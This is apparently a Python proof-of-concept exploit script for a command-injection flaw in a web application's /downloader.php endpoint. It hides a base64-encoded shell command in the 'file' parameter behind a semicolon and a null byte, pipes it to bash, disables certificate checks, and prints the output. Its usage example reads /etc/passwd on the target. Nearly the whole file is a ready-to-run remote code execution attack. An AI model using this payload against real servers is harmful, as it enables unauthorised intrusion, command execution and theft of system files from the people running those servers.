#author: laohuan12138
import requests
import base64
import urllib3
import re

urllib3.disable_warnings()

start_string = "/tmp/history.csv"
end_string = "<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.01 Transitional//EN\">"
pattern = f"{re.escape(start_string)}(.*?){re.escape(end_string)}"
def base64_encode(string):
    return base64.b64encode(string.encode('utf-8')).decode('utf-8' )

def send_paylaod(url,cmd):
    url_v = url + "/downloader.php?file=;echo%20{}|base64%20-d|bash%00.zip".format(base64_encode(cmd))
    res = requests.get(url_v,verify=False)
    if "/tmp/history.csv" in res.text:
        print("\033[31m [!] {} is vulnerability\033[0m".format(url))
    result = re.search(pattern, res.text, re.DOTALL)

    if result:
        content_between_strings = result.group(1)
        print(content_between_strings)

if __name__ == '__main__':
    import sys
    try:
        url = sys.argv[1]
        cmd = sys.argv[2]
    except:
        print('Use: python poc.py http://127.0.0.1 "cat /etc/passwd"')
        sys.exit()
    send_paylaod(url.strip(),cmd)

